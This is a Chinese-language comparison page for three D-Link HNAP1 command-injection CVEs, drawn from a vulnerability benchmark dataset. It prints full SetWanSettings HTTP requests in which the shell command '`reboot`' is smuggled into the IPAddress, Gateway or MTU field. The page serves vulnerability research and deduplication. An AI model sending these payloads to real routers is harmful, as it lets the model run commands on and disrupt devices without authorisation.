---
layout: default
permalink: /DIR-818LW.html
title: DIR-818LW PoC 大块彩色对照
firmware: "BM-2024-00083 · D-Link DIR-823G v1.0.2B05"
---

# DIR-818LW PoC 大块彩色对照

> 固件版本：BM-2024-00083 · D-Link DIR-823G v1.0.2B05（CVE 归属 DIR-818LW）。

> [!WARNING] 固件归属
> 三条 CVE 的漏洞归属是 **DIR-818LW**（NVD + TeamSeri0us 原始 PDF 一致），但下方请求实际抓自 **BM-2024-00083 = DIR-823G v1.0.2B05** 镜像，不是 818LW。三条彼此之间的相似性成立（同一镜像、同一 SetWanSettings XML）；但“同固件”严格来说只到 B05 镜像这一层，不能据此断言 818LW 上的行为。复现直接用 BM-2024-00083 容器即可。
> 证据等级均为“基准数据集抓包请求（非原始公开 PoC）”；NVD 原始引用的 TeamSeri0us PDF 已在各自来源行列出。

## A 级：CVE-2019-12786 ↔ CVE-2019-12787 ↔ CVE-2019-13481

> [!CAUTION]
> 高度相似组；<mark>黄色高亮</mark>为原 PoC 中实际变化的字段、接口、长度或载荷。

### A 级：CVE-2019-12786 ↔ CVE-2019-12787

<div class="comparison-grid">
<div class="comparison-row">
<section class="poc-card">
<h3>CVE-2019-12786</h3>
<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-12786/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>；<a href="https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/dir818-protected.pdf" target="_blank">NVD 原始引用 PDF ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12786" target="_blank">NVD ↗</a><br>证据等级：基准数据集抓包请求（非原始公开 PoC）；IoTVulBench 将该 CVE 挂在 BM-2024-00083（DIR-823G B05）仿真环境，请求抓自该镜像；本地无 DIR-818LW 固件，未在其上验证。</div>
<pre>
POST /HNAP1/ HTTP/1.1
Host: TARGET_HOST:PORT
Content-Length: 1032
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"
X-Requested-With: XMLHttpRequest
HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;
Accept: */*
Content-Type: text/xml; charset=UTF-8
Accept-Language: en-US,en;q=0.9
Origin: http://TARGET_HOST:PORT
Referer: http://TARGET_HOST:PORT/
Accept-Encoding: gzip, deflate, br
Cookie: &lt;SESSION_COOKIE&gt;
Connection: keep-alive
&nbsp;
&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetWanSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Type&gt;DHCP&lt;/Type&gt;&lt;PppoeType&gt;&lt;Username&gt;&lt;/Username&gt;&lt;Password&gt;&lt;/Password&gt;&lt;MaxIdleTime&gt;0&lt;/MaxIdleTime&gt;&lt;/PppoeType&gt;&lt;MTU&gt;1400&lt;/MTU&gt;&lt;HostName&gt;&lt;/HostName&gt;&lt;ServiceName&gt;&lt;/ServiceName&gt;&lt;AutoReconnect&gt;false&lt;/AutoReconnect&gt;<mark>&lt;IPAddress&gt;'`reboot`'&lt;/IPAddress&gt;</mark>&lt;SubnetMask&gt;&lt;/SubnetMask&gt;&lt;Gateway&gt;&lt;/Gateway&gt;&lt;DnsManual&gt;false&lt;/DnsManual&gt;&lt;MacCloneEnable&gt;false&lt;/MacCloneEnable&gt;&lt;CloneMacAddress&gt;&lt;/CloneMacAddress&gt;&lt;MacCloneType&gt;&lt;/MacCloneType&gt;&lt;WanSpeed&gt;Auto&lt;/WanSpeed&gt;&lt;WanDuplex&gt;Auto&lt;/WanDuplex&gt;&lt;ConfigDNS&gt;&lt;Primary&gt;&lt;/Primary&gt;&lt;Secondary&gt;&lt;/Secondary&gt;&lt;/ConfigDNS&gt;&lt;MacAddress&gt;&lt;/MacAddress&gt;&lt;VPNServerIPAddress&gt;&lt;/VPNServerIPAddress&gt;&lt;VPNLocalIPAddress&gt;&lt;/VPNLocalIPAddress&gt;&lt;VPNLocalSubnetMask&gt;&lt;/VPNLocalSubnetMask&gt;&lt;VPNLocalGateway&gt;&lt;/VPNLocalGateway&gt;&lt;/SetWanSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</pre>
<div>差异高亮：注入位置是 IPAddress。</div>
</section>
<section class="poc-card">
<h3>CVE-2019-12787</h3>
<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-12787/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>；<a href="https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/dir818-2-protected.pdf" target="_blank">NVD 原始引用 PDF ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12787" target="_blank">NVD ↗</a><br>证据等级：基准数据集抓包请求（非原始公开 PoC）；IoTVulBench 将该 CVE 挂在 BM-2024-00083（DIR-823G B05）仿真环境，请求抓自该镜像；本地无 DIR-818LW 固件，未在其上验证。</div>
<pre>
POST /HNAP1/ HTTP/1.1
Host: TARGET_HOST:PORT
Content-Length: 1032
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"
X-Requested-With: XMLHttpRequest
HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;
Accept: */*
Content-Type: text/xml; charset=UTF-8
Accept-Language: en-US,en;q=0.9
Origin: http://TARGET_HOST:PORT
Referer: http://TARGET_HOST:PORT/
Accept-Encoding: gzip, deflate, br
Cookie: &lt;SESSION_COOKIE&gt;
Connection: keep-alive
&nbsp;
&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetWanSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Type&gt;DHCP&lt;/Type&gt;&lt;PppoeType&gt;&lt;Username&gt;&lt;/Username&gt;&lt;Password&gt;&lt;/Password&gt;&lt;MaxIdleTime&gt;0&lt;/MaxIdleTime&gt;&lt;/PppoeType&gt;&lt;MTU&gt;1400&lt;/MTU&gt;&lt;HostName&gt;&lt;/HostName&gt;&lt;ServiceName&gt;&lt;/ServiceName&gt;&lt;AutoReconnect&gt;false&lt;/AutoReconnect&gt;&lt;IPAddress&gt;&lt;/IPAddress&gt;&lt;SubnetMask&gt;&lt;/SubnetMask&gt;<mark>&lt;Gateway&gt;'`reboot`'&lt;/Gateway&gt;</mark>&lt;DnsManual&gt;false&lt;/DnsManual&gt;&lt;MacCloneEnable&gt;false&lt;/MacCloneEnable&gt;&lt;CloneMacAddress&gt;&lt;/CloneMacAddress&gt;&lt;MacCloneType&gt;&lt;/MacCloneType&gt;&lt;WanSpeed&gt;Auto&lt;/WanSpeed&gt;&lt;WanDuplex&gt;Auto&lt;/WanDuplex&gt;&lt;ConfigDNS&gt;&lt;Primary&gt;&lt;/Primary&gt;&lt;Secondary&gt;&lt;/Secondary&gt;&lt;/ConfigDNS&gt;&lt;MacAddress&gt;&lt;/MacAddress&gt;&lt;VPNServerIPAddress&gt;&lt;/VPNServerIPAddress&gt;&lt;VPNLocalIPAddress&gt;&lt;/VPNLocalIPAddress&gt;&lt;VPNLocalSubnetMask&gt;&lt;/VPNLocalSubnetMask&gt;&lt;VPNLocalGateway&gt;&lt;/VPNLocalGateway&gt;&lt;/SetWanSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</pre>
<div>差异高亮：注入位置是 Gateway。</div>
</section>
</div>
</div>

### A 级：CVE-2019-12786 ↔ CVE-2019-13481

<div class="comparison-grid">
<div class="comparison-row">
<section class="poc-card">
<h3>CVE-2019-12786</h3>
<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-12786/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>；<a href="https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/dir818-protected.pdf" target="_blank">NVD 原始引用 PDF ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12786" target="_blank">NVD ↗</a><br>证据等级：基准数据集抓包请求（非原始公开 PoC）；IoTVulBench 将该 CVE 挂在 BM-2024-00083（DIR-823G B05）仿真环境，请求抓自该镜像；本地无 DIR-818LW 固件，未在其上验证。</div>
<pre>
POST /HNAP1/ HTTP/1.1
Host: TARGET_HOST:PORT
Content-Length: 1032
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"
X-Requested-With: XMLHttpRequest
HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;
Accept: */*
Content-Type: text/xml; charset=UTF-8
Accept-Language: en-US,en;q=0.9
Origin: http://TARGET_HOST:PORT
Referer: http://TARGET_HOST:PORT/
Accept-Encoding: gzip, deflate, br
Cookie: &lt;SESSION_COOKIE&gt;
Connection: keep-alive
&nbsp;
&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetWanSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Type&gt;DHCP&lt;/Type&gt;&lt;PppoeType&gt;&lt;Username&gt;&lt;/Username&gt;&lt;Password&gt;&lt;/Password&gt;&lt;MaxIdleTime&gt;0&lt;/MaxIdleTime&gt;&lt;/PppoeType&gt;&lt;MTU&gt;1400&lt;/MTU&gt;&lt;HostName&gt;&lt;/HostName&gt;&lt;ServiceName&gt;&lt;/ServiceName&gt;&lt;AutoReconnect&gt;false&lt;/AutoReconnect&gt;<mark>&lt;IPAddress&gt;'`reboot`'&lt;/IPAddress&gt;</mark>&lt;SubnetMask&gt;&lt;/SubnetMask&gt;&lt;Gateway&gt;&lt;/Gateway&gt;&lt;DnsManual&gt;false&lt;/DnsManual&gt;&lt;MacCloneEnable&gt;false&lt;/MacCloneEnable&gt;&lt;CloneMacAddress&gt;&lt;/CloneMacAddress&gt;&lt;MacCloneType&gt;&lt;/MacCloneType&gt;&lt;WanSpeed&gt;Auto&lt;/WanSpeed&gt;&lt;WanDuplex&gt;Auto&lt;/WanDuplex&gt;&lt;ConfigDNS&gt;&lt;Primary&gt;&lt;/Primary&gt;&lt;Secondary&gt;&lt;/Secondary&gt;&lt;/ConfigDNS&gt;&lt;MacAddress&gt;&lt;/MacAddress&gt;&lt;VPNServerIPAddress&gt;&lt;/VPNServerIPAddress&gt;&lt;VPNLocalIPAddress&gt;&lt;/VPNLocalIPAddress&gt;&lt;VPNLocalSubnetMask&gt;&lt;/VPNLocalSubnetMask&gt;&lt;VPNLocalGateway&gt;&lt;/VPNLocalGateway&gt;&lt;/SetWanSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</pre>
<div>差异高亮：完整原始 XML 见下方链接；注入字段是 IPAddress。</div>
</section>
<section class="poc-card">
<h3>CVE-2019-13481</h3>
<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-13481/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>；<a href="https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/dir818-3-protected.pdf" target="_blank">NVD 原始引用 PDF ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-13481" target="_blank">NVD ↗</a><br>证据等级：基准数据集抓包请求（非原始公开 PoC）；IoTVulBench 将该 CVE 挂在 BM-2024-00083（DIR-823G B05）仿真环境，请求抓自该镜像；本地无 DIR-818LW 固件，未在其上验证。</div>
<pre>
POST /HNAP1/ HTTP/1.1
Host: TARGET_HOST:PORT
Content-Length: 1028
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"
X-Requested-With: XMLHttpRequest
HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;
Accept: */*
Content-Type: text/xml; charset=UTF-8
Accept-Language: en-US,en;q=0.9
Origin: http://TARGET_HOST:PORT
Referer: http://TARGET_HOST:PORT/
Accept-Encoding: gzip, deflate, br
Cookie: &lt;SESSION_COOKIE&gt;
Connection: keep-alive
&nbsp;
&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetWanSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Type&gt;DHCP&lt;/Type&gt;&lt;PppoeType&gt;&lt;Username&gt;&lt;/Username&gt;&lt;Password&gt;&lt;/Password&gt;&lt;MaxIdleTime&gt;0&lt;/MaxIdleTime&gt;&lt;/PppoeType&gt;<mark>&lt;MTU&gt;'`reboot`'&lt;/MTU&gt;</mark>&lt;HostName&gt;&lt;/HostName&gt;&lt;ServiceName&gt;&lt;/ServiceName&gt;&lt;AutoReconnect&gt;false&lt;/AutoReconnect&gt;&lt;IPAddress&gt;&lt;/IPAddress&gt;&lt;SubnetMask&gt;&lt;/SubnetMask&gt;&lt;Gateway&gt;&lt;/Gateway&gt;&lt;DnsManual&gt;false&lt;/DnsManual&gt;&lt;MacCloneEnable&gt;false&lt;/MacCloneEnable&gt;&lt;CloneMacAddress&gt;&lt;/CloneMacAddress&gt;&lt;MacCloneType&gt;&lt;/MacCloneType&gt;&lt;WanSpeed&gt;Auto&lt;/WanSpeed&gt;&lt;WanDuplex&gt;Auto&lt;/WanDuplex&gt;&lt;ConfigDNS&gt;&lt;Primary&gt;&lt;/Primary&gt;&lt;Secondary&gt;&lt;/Secondary&gt;&lt;/ConfigDNS&gt;&lt;MacAddress&gt;&lt;/MacAddress&gt;&lt;VPNServerIPAddress&gt;&lt;/VPNServerIPAddress&gt;&lt;VPNLocalIPAddress&gt;&lt;/VPNLocalIPAddress&gt;&lt;VPNLocalSubnetMask&gt;&lt;/VPNLocalSubnetMask&gt;&lt;VPNLocalGateway&gt;&lt;/VPNLocalGateway&gt;&lt;/SetWanSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</pre>
<div>差异高亮：Content-Length 变为 1028，注入字段是 MTU。</div>
</section>
</div>
</div>

## 三条请求的判定

几乎完全重复。 共同部分是 `/HNAP1/`、`SetWanSettings`、DHCP XML 和 ``'&#96;reboot&#96;'``；变化只发生在 `IPAddress`、`Gateway`、`MTU` 三个业务字段。

完整原始请求：[CVE-2019-12786](#CVE-2019-12786)、[CVE-2019-12787](#CVE-2019-12787)、[CVE-2019-13481](#CVE-2019-13481)。

> [!NOTE] HNAP1 抓包字段说明
> 三条 seed 的 SOAPAction 均为 GetWanCurrentStatus，而请求 Body 为 SetWanSettings；这是 seed 原文中的抓包特征，本页按原文保留，没有把它改写成看似更规范的 SOAPAction。
